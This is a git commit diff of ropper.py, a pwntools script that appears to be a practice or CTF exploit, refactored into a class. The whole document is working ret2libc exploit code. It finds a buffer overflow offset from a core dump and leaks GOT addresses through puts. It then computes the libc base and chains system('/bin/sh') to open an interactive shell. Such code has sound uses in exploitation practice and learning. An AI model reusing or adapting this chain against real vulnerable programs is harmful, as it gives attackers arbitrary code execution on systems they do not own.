105e5e95dbca4809e20778f95c934eb460c3eaa2
Nameless-chan <nameless-chan@protonmail.com>
2021-11-20 22:12:28 +0100

    used class instead of nothing. IT WORKS WOUHOUUU

--- ropper.py
+++ ropper.py
@@ -1,90 +1,80 @@
 from pwn import *
 #context.log_level = 'debug'
-elf = ELF("./tests/ret")
-rop = ROP(elf)
-offset_leaking = elf.process()
+class Exploit:
+	def __init__(self):
+		self.elf = ELF("./tests/ret")
+		self.offset_leaking = self.elf.process()
+		self.rop = ROP(self.elf)
+		#script = """
+		#b *0x0000000000401185
+		#"""
+		#self.p = self.elf.debug(gdbscript=script)
+		self.p = self.elf.process()
+		context.arch = 'amd64'
 
-#script = """
-#b* 0x401185
-#"""
-#p = elf.debug(gdbscript=script)
+	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
+		try:
+			instance.call(*args)
+		except exception:
+			log.warning(message)
+			callback()
 
-p = elf.process()
+	def offset_finder(self, offset_leaking):
+		offset_leaking = offset_leaking
+		offset = b""
+		if offset == b"":
+			log.info("Searching for offset")
+			self.offset_leaking.sendline(cyclic(516,n=8))
+			self.offset_leaking.wait()
+			core = Coredump('./core')
+			offset = cyclic_find(core.read(core.rsp,8),n=8)
+			log.info(f"Offset is {offset}")
+		return offset
 
-context.arch = 'amd64'
+	def payload_generator(self, instance, offset):
+		payload = [
+			b"A"*offset,
+			instance.chain()
+		]
+		print(payload)
+		payload = b"".join(payload)
+		return payload
 
-### FIND OFFSET 
-OFFSET = b""
-if OFFSET == b"":
-	log.info("Searching for offset")
-	offset_leaking.sendline(cyclic(516,n=8))
-	offset_leaking.wait()
-	core = Coredump('./core')
-	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
-	log.info(f"Offset is {OFFSET}")
+	def main(self):
+		offset = self.offset_finder(self.offset_leaking)
 
-### LEAK PUTS AND GETS
-p.recv()
+		self.p.recv()
 
-def recovery(message, *args, exception=Exception, callback=lambda: None):
-	try:
-		rop.call(*args)
-	except exception:
-		log.warning(message)
-		callback()
+		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
+		for func in available_funcs:
+			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
+		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
+		
+		payload1 = self.payload_generator(self.rop,offset)
+		self.p.sendline(payload1)
 
-list_to_leak = ['puts', 'gets', 'printf', 'read', '__libc_start_main']
-available_funcs = tuple(name for name in elf.got.keys() if name in list_to_leak)
+		for name in available_funcs: 
+			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+			log.info(f"{name} @ {hex(leaked)}")
+		
+		LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
+		if LIBC:
+			libc = ELF(LIBC)
+			libc.address = leaked - libc.symbols[available_funcs[-1]]
+			log.info(f"base libc {hex(libc.address)}")
+		else:
+			log.warning("No LIBC set. Please go to https://libc.blukat.me/")
+			exit()
 
-for func in available_funcs:
-	recovery(f"No {func} in GOT", elf.symbols["puts"], [elf.got[func]])
+		roplibc = ROP(libc)
+		self.recovery(roplibc, "Couldn't find ret", roplibc.find_gadget(["ret"]))
+		self.recovery(roplibc, "Didn't found system...","system",[ next(libc.search(b"/bin/sh\x00")) ])
+		self.recovery(roplibc,"Didn't found exit...","exit")
 
-recovery(f"No main found...", elf.symbols["main"])
+		payload2 = self.payload_generator(roplibc, offset)
 
-payload1 = [
-	b"A"*OFFSET,
-	rop.chain()
-]
+		self.p.sendline(payload2)
+		self.p.interactive()
 
-payload1 = b"".join(payload1)
-p.sendline(payload1)
-
-for name in available_funcs: 
-	leaked = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
-	log.info(f"{name} @ {hex(leaked)}")
-
-### CHECK IF YOU FOUND LIBC
-LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
-if LIBC:
-	libc = ELF(LIBC)
-	libc.address = leaked - libc.symbols[available_funcs[-1]]
-	log.info(f"base libc {hex(libc.address)}")
-else:
-	log.warning("No LIBC set. Please go to https://libc.blukat.me/")
-	exit()
-
-### SPAWN /bin/sh
-roplibc = ROP(libc)
-RET = (roplibc.find_gadget(['ret']))[0]
-POP_RDI = (roplibc.find_gadget(['pop rdi', 'ret']))[0]
-BINSH = next(libc.search(b"/bin/sh"))
-SYSTEM = libc.sym["system"]
-EXIT = libc.sym["exit"]
-
-log.info("POP_RDI @ 0x{:x}".format(POP_RDI))
-log.info("/bin/sh @ 0x{:x}".format(BINSH))
-log.info("system @ 0x{:x}".format(SYSTEM))
-log.info("exit @ 0x{:x}".format(EXIT))
-
-payload2 = [
-	b"A"*OFFSET,
-	p64(RET),
-	p64(POP_RDI),
-	p64(BINSH),
-	p64(SYSTEM),
-	p64(EXIT)
-]
-payload2 = b"".join(payload2)
-
-p.sendline(payload2)
-p.interactive()
+exploit = Exploit()
+exploit.main()
